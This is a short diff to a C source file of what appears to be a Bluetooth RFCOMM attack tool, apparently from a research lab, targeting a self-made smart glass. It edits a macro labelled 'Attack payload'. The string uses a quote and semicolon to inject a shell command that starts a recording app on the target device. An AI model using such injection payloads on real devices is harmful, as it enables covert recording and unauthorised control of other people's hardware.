@@ -19,7 +19,7 @@
 #define RFCOMM_CHANNEL 1
 
 /* Attack payload */
-#define PAYLOAD "Hello\"; python3 /home/matsumoto/bt_attack/Selfmade_smartglass/Recording_app/start_rec; #"
+#define PAYLOAD "Hello\"; /home/matsumoto/bt_attack/Selfmade_smartglass/Recording_app/start_rec; #"
 
 void print_banner(void) {
     printf("--------------------------------------------------\n");
